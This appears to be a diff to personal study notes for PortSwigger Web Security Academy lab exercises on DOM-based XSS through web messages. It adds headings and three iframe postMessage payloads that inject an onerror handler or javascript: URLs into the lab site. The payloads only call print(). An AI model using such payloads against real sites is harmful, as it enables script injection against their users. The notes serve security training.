@@ -6,11 +6,13 @@
 
 ## DOM-Based
 - Ctrl+F to find event listener, then use the following payloads in exploit server.
+
+- ==DOM XSS using web messages==
 ```
 <iframe src="//lab_id.web-security-academy.net/" 
 onload="this.contentWindow.postMessage('\<img src=1 onerror=print()>','*')">
 ```
-	- ==DOM XSS using web messages and a JavaScript URL  ==
+- ==DOM XSS using web messages and a JavaScript URL  ==
 ```
 	  window.addEventListener('message', function(e) {
                             var url = e.data;
@@ -20,7 +22,9 @@ onload="this.contentWindow.postMessage('\<img src=1 onerror=print()>','*')">
                         }, false);
         
 <iframe src="//lab_id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
-
+```
+- ==DOM XSS using web messages and JSON.parse==
+```
 <iframe src=https://lab_id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
 ```
 	
